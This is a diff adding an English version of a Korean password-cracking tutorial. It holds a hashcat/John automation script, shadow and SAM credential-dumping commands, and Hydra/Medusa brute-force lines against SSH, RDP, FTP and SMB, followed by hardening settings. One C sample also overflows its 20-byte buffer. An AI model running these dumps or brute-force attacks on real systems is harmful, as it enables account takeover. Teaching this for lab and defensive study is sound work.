@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 패스워드 크랙 — 이론과 실전
 
 ## 1. 패스워드 해시 기초
@@ -861,4 +867,865 @@ auth required pam_tally2.so onerr=fail audit silent deny=5 unlock_time=900
 - 잠금 임계값: 5번
 - 잠금 기간: 30분
 - 잠금 카운터 리셋: 15분
+```
+
+
+---
+
+<a name="english"></a>
+
+# Password Cracking — Theory and Practice
+
+## 1. Password Hash Basics
+
+### Hash Function Properties
+- **One-way**: Cannot recover original text from hash value
+- **Same input → Same output**: Same password always produces same hash
+- **Avalanche effect**: Changing 1 bit of input produces completely different hash
+
+### Major Hash Algorithms
+| Algorithm | Length | Security | Example |
+|-----------|--------|----------|---------|
+| MD5 | 128-bit (32 chars) | Weak | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| SHA-1 | 160-bit (40 chars) | Weak | 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 |
+| SHA-256 | 256-bit (64 chars) | Good | 5e884898da28047151d0e56f8dc6292... |
+| SHA-512 | 512-bit (128 chars) | Strong | - |
+| bcrypt | Variable | Strong | $2y$10$... |
+| PBKDF2 | Variable | Strong | Iterated hash |
+
+### Hash Identification Methods
+
+The hashid tool automatically identifies the algorithm type of a hash string. It can distinguish between various hash formats like MD5, SHA-1, and bcrypt.
+
+```bash
+# Identify hash type with hashid
+hashid '5f4dcc3b5aa765d61d8327deb882cf99'
+hashid '$1$abc$xyz...'
+hashid '$6$salt$hash...'
+
+# hash-identifier tool
+hash-identifier
+
+# Manual identification
+# $1$ → MD5 crypt
+# $5$ → SHA-256 crypt
+# $6$ → SHA-512 crypt (current Linux default)
+# $2y$ or $2b$ → bcrypt
+# $apr1$ → Apache MD5
+```
+
+### Automated Hash Identification and Cracking (Python)
+
+```python
+#!/usr/bin/env python3
+"""
+Automated hash identification and cracking tool
+- Auto-detect hash format
+- Automatically invoke John the Ripper / hashcat
+- Batch process multiple hashes
+Usage: python3 hash_cracker.py -H '<hash>' -w rockyou.txt
+       python3 hash_cracker.py -f hashes.txt -w wordlist.txt --tool hashcat
+"""
+import argparse
+import hashlib
+import re
+import shutil
+import subprocess
+import sys
+import tempfile
+from pathlib import Path
+
+
+# Hash patterns → (name, hashcat mode, john format)
+HASH_SIGNATURES: list[tuple[re.Pattern, str, str, str]] = [
+    (re.compile(r"^\$6\$[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{86}$"),
+     "SHA-512 crypt", "1800", "sha512crypt"),
+    (re.compile(r"^\$5\$[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{43}$"),
+     "SHA-256 crypt", "7400", "sha256crypt"),
+    (re.compile(r"^\$2[ayb]\$\d{2}\$[./A-Za-z0-9]{53}$"),
+     "bcrypt", "3200", "bcrypt"),
+    (re.compile(r"^\$1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}$"),
+     "MD5 crypt", "500", "md5crypt"),
+    (re.compile(r"^\$apr1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}$"),
+     "Apache MD5", "1600", "md5crypt-opencl"),
+    (re.compile(r"^[0-9a-fA-F]{128}$"),
+     "SHA-512", "1700", "raw-sha512"),
+    (re.compile(r"^[0-9a-fA-F]{64}$"),
+     "SHA-256", "1400", "raw-sha256"),
+    (re.compile(r"^[0-9a-fA-F]{40}$"),
+     "SHA-1", "100", "raw-sha1"),
+    (re.compile(r"^[0-9a-fA-F]{32}$"),
+     "MD5", "0", "raw-md5"),
+    (re.compile(r"^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$"),
+     "NTLM (LM:NTLM)", "1000", "nt"),
+    (re.compile(r"^aad3b435b51404eeaad3b435b51404ee:[0-9a-fA-F]{32}$"),
+     "NTLM (empty LM)", "1000", "nt"),
+]
+
+
+def identify_hash(hash_str: str) -> tuple[str, str, str]:
+    """Analyze hash string and return (name, hashcat_mode, john_format)."""
+    h = hash_str.strip()
+    for pattern, name, hc_mode, john_fmt in HASH_SIGNATURES:
+        if pattern.match(h):
+            return name, hc_mode, john_fmt
+    return "Unknown", "", ""
+
+
+def verify_hash(plaintext: str, hash_str: str, hash_name: str) -> bool:
+    """Simple local verification (MD5/SHA-1/SHA-256/SHA-512)."""
+    name_lower = hash_name.lower()
+    algo_map = {
+        "md5": hashlib.md5,
+        "sha-1": hashlib.sha1,
+        "sha-256": hashlib.sha256,
+        "sha-512": hashlib.sha512,
+    }
+    for key, fn in algo_map.items():
+        if key in name_lower:
+            return fn(plaintext.encode()).hexdigest().lower() == hash_str.lower()
+    return False
+
+
+def crack_with_john(hash_str: str, john_fmt: str, wordlist: Path) -> str | None:
+    """Crack single hash with John the Ripper. Returns plaintext on success."""
+    john_bin = shutil.which("john")
+    if not john_bin:
+        print("[!] john not found")
+        return None
+
+    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
+        tf.write(f"target:{hash_str}\n")
+        hash_file = tf.name
+
+    try:
+        cmd = [john_bin, f"--wordlist={wordlist}", f"--format={john_fmt}", hash_file]
+        print(f"  [*] Running: {' '.join(cmd)}")
+        subprocess.run(cmd, capture_output=True, timeout=300)
+
+        # Check results
+        result = subprocess.run(
+            [john_bin, "--show", f"--format={john_fmt}", hash_file],
+            capture_output=True, text=True, timeout=10,
+        )
+        for line in result.stdout.splitlines():
+            if ":" in line and not line.startswith("0 password"):
+                return line.split(":", 1)[1].strip()
+    except subprocess.TimeoutExpired:
+        print("[!] john timed out")
+    finally:
+        Path(hash_file).unlink(missing_ok=True)
+
+    return None
+
+
+def crack_with_hashcat(hash_str: str, hc_mode: str, wordlist: Path) -> str | None:
+    """Crack single hash with hashcat. Returns plaintext on success."""
+    hashcat_bin = shutil.which("hashcat")
+    if not hashcat_bin:
+        print("[!] hashcat not found")
+        return None
+
+    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
+        tf.write(f"{hash_str}\n")
+        hash_file = tf.name
+
+    outfile = hash_file + ".cracked"
+    try:
+        cmd = [
+            hashcat_bin, "-m", hc_mode, "-a", "0",
+            "--quiet", "--potfile-disable",
+            "-o", outfile,
+            hash_file, str(wordlist),
+        ]
+        print(f"  [*] Running: hashcat -m {hc_mode} ...")
+        subprocess.run(cmd, capture_output=True, timeout=600)
+
+        cracked = Path(outfile)
+        if cracked.exists():
+            content = cracked.read_text().strip()
+            if ":" in content:
+                return content.split(":", 1)[1]
+    except subprocess.TimeoutExpired:
+        print("[!] hashcat timed out")
+    finally:
+        Path(hash_file).unlink(missing_ok=True)
+        Path(outfile).unlink(missing_ok=True)
+
+    return None
+
+
+def process_hashes(hashes: list[str], wordlist: Path, tool: str) -> None:
+    for i, h in enumerate(hashes, 1):
+        h = h.strip()
+        if not h:
+            continue
+        print(f"\n[{i}/{len(hashes)}] Hash: {h[:60]}{'...' if len(h) > 60 else ''}")
+        name, hc_mode, john_fmt = identify_hash(h)
+        print(f"  Format detected: {name}  (hashcat={hc_mode}, john={john_fmt})")
+
+        if name == "Unknown":
+            print("  [!] Unknown format — manual verification required")
+            continue
+
+        cracked: str | None = None
+        if tool in ("john", "auto") and john_fmt:
+            cracked = crack_with_john(h, john_fmt, wordlist)
+        if cracked is None and tool in ("hashcat", "auto") and hc_mode:
+            cracked = crack_with_hashcat(h, hc_mode, wordlist)
+
+        if cracked:
+            print(f"  [+] Crack successful: {cracked}")
+            if verify_hash(cracked, h, name):
+                print(f"  [+] Verified")
+        else:
+            print(f"  [-] Crack failed (not found in wordlist)")
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="Automated hash identification and cracking tool",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""Examples:
+  python3 hash_cracker.py -H '5f4dcc3b5aa765d61d8327deb882cf99' -w rockyou.txt
+  python3 hash_cracker.py -f hashes.txt -w wordlist.txt --tool hashcat
+  python3 hash_cracker.py -H '$6$salt$hash...' -w rockyou.txt --tool john
+        """,
+    )
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument("-H", "--hash", help="Single hash string")
+    group.add_argument("-f", "--file", type=Path, help="Hash list file (one per line)")
+
+    parser.add_argument("-w", "--wordlist", type=Path, required=True, help="Wordlist file")
+    parser.add_argument("--tool", choices=["john", "hashcat", "auto"], default="auto",
+                        help="Cracking tool to use (default: auto)")
+    args = parser.parse_args()
+
+    if not args.wordlist.exists():
+        sys.exit(f"[!] Wordlist file not found: {args.wordlist}")
+
+    if args.hash:
+        hashes = [args.hash]
+    else:
+        if not args.file.exists():
+            sys.exit(f"[!] Hash file not found: {args.file}")
+        hashes = args.file.read_text().splitlines()
+
+    print(f"[*] Hashes to process: {len(hashes)}  |  Wordlist: {args.wordlist}")
+    process_hashes(hashes, args.wordlist, args.tool)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 2. Linux Password Structure
+
+### /etc/shadow File Format
+```
+username:$id$salt$hash:lastchange:min:max:warn:inactive:expire:reserved
+
+Example:
+root:$6$R8Fsra2UhPITBTnR$SttrOIIggOjtCtwag.O4JHnCCMQ8rvsqaCuU2VV1Mlvk...:15285:0:99999:7:::
+
+Field interpretation:
+- username: root
+- $id: $6 = SHA-512 algorithm
+- $salt: R8Fsra2UhPITBTnR (random salt)
+- $hash: actual hash value
+- lastchange: 15285 (days since 1970-01-01)
+- min: 0 (minimum password age)
+- max: 99999 (password expiry days)
+- warn: 7 (warn 7 days before expiry)
+```
+
+### Role of Salt
+```
+Without salt:
+  password → 5f4dcc3b5aa765d... (always same → rainbow table attack possible)
+
+With salt:
+  password + salt_a → seemingly random hash_a
+  password + salt_b → completely different hash_b
+  (same password with different salt produces different hash → defeats rainbow tables)
+```
+
+### Direct Hash Generation and Verification (C Code)
+
+C code to generate and verify hashes. Helps understand how hash functions work at the system level.
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <crypt.h>
+#include <stdlib.h>
+
+int main(void) {
+    char *pHash;
+    char *pWord;
+    char *pResult;
+
+    pHash = (char*) calloc(20, sizeof(char));
+    pWord = (char*) calloc(30, sizeof(char));
+
+    strcpy(pWord, "mypassword");
+    strcpy(pHash, "$6$R8Fsra2UhPITBTnR$");  // Specify only the salt portion
+
+    pResult = crypt(pWord, pHash);
+    printf("%s\n", pResult);
+
+    free(pWord);
+    free(pHash);
+    return 0;
+}
+```
+```bash
+gcc -o hashtest hashtest.c -lcrypt
+./hashtest
+# Compare output hash with /etc/shadow hash to verify
+```
+
+### Hash Generation and Verification with Python
+
+```python
+#!/usr/bin/env python3
+"""
+Linux shadow-compatible hash generation and verification tool
+Usage: python3 shadow_hash.py generate <password> [--algorithm sha512]
+       python3 shadow_hash.py verify <password> <shadow_entry>
+"""
+import argparse
+import hashlib
+import os
+import secrets
+import sys
+
+
+def generate_salt(length: int = 16) -> str:
+    """Generate shadow-compatible salt string (./A-Za-z0-9)."""
+    alphabet = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+    return "".join(secrets.choice(alphabet) for _ in range(length))
+
+
+def make_shadow_hash(password: str, algorithm: str = "sha512", salt: str | None = None) -> str:
+    """Generate Linux shadow file-compatible hash."""
+    algo_map = {"md5": "1", "sha256": "5", "sha512": "6"}
+    if algorithm not in algo_map:
+        sys.exit(f"[!] Unsupported algorithm: {algorithm}")
+
+    import crypt  # Available in Python 3.9 and below (removed in 3.13)
+    prefix = algo_map[algorithm]
+    salt = salt or generate_salt(16)
+    salt_str = f"${prefix}${salt}$"
+    return crypt.crypt(password, salt_str)
+
+
+def verify_shadow_entry(password: str, shadow_hash: str) -> bool:
+    """Check if password matches shadow hash."""
+    import crypt
+    return crypt.crypt(password, shadow_hash) == shadow_hash
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Linux shadow hash generation/verification")
+    sub = parser.add_subparsers(dest="action")
+
+    gen = sub.add_parser("generate", help="Generate hash")
+    gen.add_argument("password", help="Password to hash")
+    gen.add_argument("-a", "--algorithm", choices=["md5", "sha256", "sha512"],
+                     default="sha512", help="Hash algorithm (default: sha512)")
+    gen.add_argument("--salt", help="Fixed salt (random if not specified)")
+
+    ver = sub.add_parser("verify", help="Verify hash")
+    ver.add_argument("password", help="Plaintext password to verify")
+    ver.add_argument("hash", help="Shadow hash string")
+
+    args = parser.parse_args()
+    if not args.action:
+        parser.print_help()
+        return
+
+    try:
+        if args.action == "generate":
+            h = make_shadow_hash(args.password, args.algorithm, args.salt)
+            print(f"Hash: {h}")
+            print(f"Shadow format: username:{h}:...")
+        else:
+            match = verify_shadow_entry(args.password, args.hash)
+            print(f"[{'+' if match else '-'}] Password {'matches' if match else 'does not match'}")
+            sys.exit(0 if match else 1)
+    except ImportError:
+        sys.exit("[!] crypt module not found — use passlib: pip3 install passlib")
+    except Exception as e:
+        sys.exit(f"[!] Error: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 3. John the Ripper
+
+### Installation and Basic Usage
+
+John the Ripper cracking commands. Auto-detects hash format and applies default wordlist with mutation rules. Use `--show` to view already cracked results, and `--restore` to resume interrupted cracking.
+
+```bash
+# Package installation
+apt-get install john
+
+# Or compile from source
+wget https://www.openwall.com/john/g/john-1.9.0.tar.gz
+tar -xzvf john-1.9.0.tar.gz
+cd john-1.9.0/src
+make linux-x86-64
+
+cd ../run
+ls  # Verify john executable
+```
+
+### Basic Attack Modes
+
+```bash
+# 1. Brute force attack (default mode)
+./john /etc/shadow
+
+# 2. Dictionary attack (Wordlist)
+./john --wordlist=password.lst /etc/shadow
+./john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow
+
+# 3. Rule-based attack (Wordlist + mutations)
+./john --wordlist=password.lst --rules /etc/shadow
+
+# 4. Specify format explicitly
+./john --format=md5crypt shadow_md5.txt
+./john --format=sha512crypt /etc/shadow
+./john --format=NT /etc/shadow  # Windows NTLM
+
+# 5. View results
+./john --show /etc/shadow
+
+# 6. Continue excluding already cracked
+./john --restore /etc/shadow
+```
+
+### Custom Wordlist Extension
+
+Extend existing wordlists by adding mutation patterns. Including target-specific words increases cracking success rate.
+
+```bash
+# Add to wordlist
+echo "mypassword123" >> /usr/share/wordlists/custom.lst
+echo "company2024!" >> /usr/share/wordlists/custom.lst
+
+# Merge passwd + shadow with unshadow (required)
+unshadow /etc/passwd /etc/shadow > combined.txt
+./john --wordlist=rockyou.txt combined.txt
+```
+
+### john.conf Rule Customization
+
+```
+# Example rules that can be added to /etc/john/john.conf
+[List.Rules:Custom]
+: 			# Original word as-is
+c 			# Capitalize first letter
+u 			# All uppercase
+l 			# All lowercase
+$1 			# Append 1
+$! 			# Append !
+Az"[0-9]"		# Append digit
+```
+
+---
+
+## 4. Hashcat
+
+### GPU-Based High-Speed Cracking
+
+hashcat GPU-based password cracking commands. Use `-m` to specify hash type (0=MD5, 1000=NTLM, 1800=SHA512crypt, etc.) and `-a` for attack mode. With a high-performance GPU, common passwords can be cracked in seconds to minutes.
+
+```bash
+# Check hash modes
+hashcat --help | grep -i md5
+hashcat --help | grep -i sha
+
+# Key hash modes
+# 0    = MD5
+# 100  = SHA-1
+# 1400 = SHA-256
+# 1800 = SHA-512 (Linux shadow)
+# 1000 = NTLM (Windows)
+# 2500 = WPA/WPA2 (Wi-Fi)
+# 3200 = bcrypt
+
+# Dictionary attack
+hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1800 -a 0 shadow_hash.txt rockyou.txt
+
+# Brute force attack (mask attack)
+hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a  # All chars, 6 digits
+
+# Mask character classes
+# ?l = lowercase [a-z]
+# ?u = uppercase [A-Z]
+# ?d = digits [0-9]
+# ?s = special characters
+# ?a = all (?l+?u+?d+?s)
+
+# Rule-based attack
+hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Combination attack (combine two words)
+hashcat -m 0 -a 1 hash.txt words1.txt words2.txt
+
+# GPU performance test
+hashcat -b -m 0
+```
+
+---
+
+## 5. Windows Password Cracking
+
+### SAM Database Structure
+```
+Windows authentication flow:
+  1. User input → Winlogon
+  2. Winlogon → LSA (Local Security Authority)
+  3. LSA → SAM (Security Accounts Manager)
+  4. SAM: %SystemRoot%\system32\config\sam (locked while running)
+  5. Security subsystem compares NTLM hash
+
+SAM file location: C:\Windows\System32\config\SAM
+SYSTEM file:       C:\Windows\System32\config\SYSTEM
+```
+
+### Windows Authentication Architecture (Detail)
+```
+Winlogon → LSA → SAM → SRM
+
+1. Winlogon
+   - Process handling user login
+   - Passes credentials to LSA
+
+2. LSA (Local Security Authority)
+   - Handles local login
+   - Checks security policies
+   - Generates SID (Security Identifier)
+   - Records security logs
+
+3. SAM (Security Accounts Manager)
+   - Database storing user/group account information
+   - Compares input credentials with SAM database to authenticate
+   - SAM file location: %SystemRoot%\system32\config\sam
+   - Locked while system is running (cannot access directly)
+
+4. SRM (Security Reference Monitor)
+   - Assigns SIDs to objects
+   - Controls file/directory access (Access) based on SID
+   - Records audit logs
+```
+
+### Windows Authentication Protocol — Challenge & Response
+```
+Network authentication method: Challenge-Response protocol
+(Client sends response to challenge over network)
+
+Response generation algorithm:
+
+1. LM (LAN Manager) — Very weak, legacy
+   - Pads password to 14 chars, truncates if over 14
+   - Converts all to uppercase
+   - Splits into 7-char blocks and DES encrypts
+   - Vulnerability: Can attack in 7-char units
+
+2. NTLM — DES encryption-based, 1st generation
+   - Uses MD4 hash
+   - Stronger than LM but still vulnerable
+   - Vulnerable to Pass-the-Hash attacks
+
+3. NTLMv2 — Default method since Windows XP
+   - Challenge-Response method
+   - Combines server challenge + client challenge
+   - Includes timestamp to defend against replay attacks
+   - Relatively secure but crackable
+```
+
+### Cain & Abel Usage
+```
+1. Rainbow table cracking:
+   Cracker → LM & NTLM Hashes → Add to List → Select cracking mode
+   Cryptanalysis Attack → NTLM Hashes → Rainbow Table Crack
+
+2. Dictionary attack:
+   Dictionary Attack → NTLM Hashes → Specify wordlist file
+
+3. Brute force:
+   Brute-Force Attack → Select character set
+```
+
+### Windows SAM Dump (Admin Privileges Required)
+
+```bash
+# Metasploit Meterpreter
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+user:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+
+# secretsdump.py (impacket)
+python secretsdump.py Administrator:password@192.168.1.100
+
+# fgdump.exe (run from within Windows)
+fgdump.exe
+
+# Use Volume Shadow Copy (copy locked SAM file)
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\
+```
+
+### Ophcrack (Rainbow Tables)
+
+Ophcrack is a Windows password cracking tool using rainbow tables. Can crack NTLM hashes very quickly, but table files are very large.
+
+```bash
+# Install on Kali
+apt-get install ophcrack
+
+# Offline cracking with LiveCD version
+# 1. Boot Ophcrack LiveCD
+# 2. Automatically detects Windows SAM file
+# 3. Automatically cracks LM hashes with rainbow tables
+
+# Download rainbow tables (separately)
+# tables_vista_free: for Vista/7
+# tables_xp_free: for XP (3.8GB)
+```
+
+---
+
+## 6. Wordlist Strategy
+
+### Well-Known Wordlists
+
+Default wordlist files included with Kali Linux. rockyou.txt is the most widely used dictionary file.
+
+```bash
+# Kali Linux built-in
+ls /usr/share/wordlists/
+# rockyou.txt (14 million - actual leaked passwords)
+
+# SecLists (best wordlist collection)
+git clone https://github.com/danielmiessler/SecLists /opt/seclists
+
+# Key paths
+/opt/seclists/Passwords/
+/opt/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
+```
+
+### Custom Wordlist Generation
+
+#### CeWL (Website-based)
+
+CeWL crawls a target website to generate a custom wordlist of words relevant to that organization.
+
+```bash
+# Extract words from target website
+cewl http://target.com -d 3 -m 5 -w custom_wordlist.txt
+# -d 3 : crawl up to 3 levels deep
+# -m 5 : minimum 5 characters
+```
+
+#### Crunch (Pattern-based generation)
+
+Generate wordlists based on specific patterns and character sets with Crunch. Effective when you know the password policy.
+
+```bash
+# 4-digit number combinations (0000~9999)
+crunch 4 4 0123456789 -o pin.txt
+
+# 6 lowercase characters
+crunch 6 6 abcdefghijklmnopqrstuvwxyz -o lowercase6.txt
+
+# Specific pattern (@ = lowercase, , = uppercase, % = digit, ^ = special)
+crunch 8 8 -t @@@@%%%% -o pattern.txt  # 4 lowercase + 4 digits
+
+# Combination
+crunch 6 8 abc123!@ -o combo.txt
+```
+
+---
+
+## 7. WinRTGen (Rainbow Table Generation)
+
+```
+WinRTGen is a tool for generating rainbow tables directly
+(Downloading pre-generated tables is more efficient)
+
+Configuration parameters:
+- Hash: Select NTLM, LM, MD5, etc.
+- Charset: Character set (alphanumeric, etc.)
+- Min/Max Length: Password length range
+- Table Count: Number of tables to generate
+- Chain Length: Chain length (larger = less time, larger file size)
+
+Generation time:
+- Requires high-performance GPU
+- Using pre-generated tables is practical
+```
+
+---
+
+## 8. FTP Brute Force — white.c Practice Tool
+
+### white.c Compilation and Execution
+
+Steps to compile and run the white.c multi-threaded password cracker. Must link the pthread library for compilation.
+
+```bash
+# Compile source (pthread link required)
+gcc -o ftpcrack white.c -lpthread
+
+# Enter target server info when running
+./ftpcrack
+# Server IP  : 192.168.203.129  (Windows Server 2008)
+# Target ID  : tester           (FTP account ID)
+```
+
+### Attack Menu Structure
+```
+white> help
+
+No.  Description                        Shortcut
+---  ---------------------------------  --------
+1    Sequential brute force (single)    a. [One Process] Sequence Brute Forcing Attack
+2    Random brute force (single)        b. [One Process] Random Brute Forcing Attack
+3    Dictionary attack (single)         c. [One Process] Dictionary Attack
+4    Sequential brute force (multi)     d. [Multi Threading] Sequence Brute Forcing Attack
+5    Exit program                       e. [Multi Threading] Random Brute Forcing Attack
+                                        f. [Multi Threading] Random Brute Forcing Attack + swap first char case
+
+Default character set:
+  0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+```
+
+### Dictionary Attack Execution Example
+
+```bash
+# Enter c → Run [One Process] Dictionary Attack
+# Sequential attack using words from wordlist.txt
+white> c
+
+# Multi-threading attack (enter d)
+# Sequential brute force with multiple threads → improved speed
+white> d
+```
+
+### Environment Setup
+```
+1. Install Windows Server 2008 (FTP server)
+2. Install IIS FTP and create accounts
+   net user /add test1 12345
+   net user /add test2 asdf
+   net user /add test3 qwer12
+3. Allow ICMP in firewall (for ping communication check)
+4. Compile and run white.c from CentOS (attacker)
+```
+
+---
+
+## 8-2. Online Cracking Tools
+
+### Hydra (Network Service Brute Forcer)
+
+Hydra is an online password brute force tool supporting dozens of protocols including SSH, FTP, HTTP, and SMB. It directly attempts login credentials against online services using wordfiles or brute force.
+
+```bash
+# SSH brute force
+hydra -l root -P rockyou.txt ssh://192.168.1.100
+
+# FTP brute force
+hydra -l admin -P rockyou.txt ftp://192.168.1.100
+
+# HTTP form brute force
+hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form \
+  "/login:user=^USER^&pass=^PASS^:Invalid credentials"
+
+# RDP brute force
+hydra -l Administrator -P rockyou.txt rdp://192.168.1.100
+
+# Multi-thread configuration
+hydra -l admin -P rockyou.txt -t 16 ssh://192.168.1.100
+
+# Use user list
+hydra -L users.txt -P rockyou.txt ssh://192.168.1.100
+```
+
+### Medusa
+
+Medusa is a parallel online login brute force tool. Supports various protocols including FTP, SSH, and HTTP.
+
+```bash
+# FTP attack
+medusa -h 192.168.1.100 -u admin -P rockyou.txt -M ftp
+
+# SSH attack
+medusa -h 192.168.1.100 -u root -P rockyou.txt -M ssh -t 8
+
+# SMB attack
+medusa -h 192.168.1.100 -u administrator -P rockyou.txt -M smbnt
+```
+
+---
+
+## 9. Password Policy and Security Hardening
+
+### /etc/login.defs Configuration (Linux)
+```
+PASS_MAX_DAYS   90     # Maximum 90 days
+PASS_MIN_DAYS   1      # Minimum 1 day retention
+PASS_WARN_AGE   7      # Warn 7 days before expiry
+PASS_MIN_LEN    8      # Minimum 8 characters
+```
+
+### PAM Configuration (Linux PAM Module)
+
+Harden Linux password policies with PAM (Pluggable Authentication Modules). Can configure minimum length, complexity, account lockout, and more.
+
+```bash
+# /etc/pam.d/common-password
+password requisite pam_pwquality.so retry=3 minlen=12 \
+    dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1
+
+# Meanings:
+# retry=3: 3 retries
+# minlen=12: minimum 12 characters
+# dcredit=-1: minimum 1 digit
+# ucredit=-1: minimum 1 uppercase
+# ocredit=-1: minimum 1 special character
+# lcredit=-1: minimum 1 lowercase
+
+# Account lockout (after 5 failures)
+auth required pam_tally2.so onerr=fail audit silent deny=5 unlock_time=900
+```
+
+### Windows Security Policy
+```
+# secpol.msc → Account Policies
+
+Password Policy:
+- Minimum length: 12 characters or more
+- Complexity requirements: Enabled
+- Maximum password age: 90 days
+
+Account Lockout Policy:
+- Lockout threshold: 5 attempts
+- Lockout duration: 30 minutes
+- Reset lockout counter after: 15 minutes
 ```
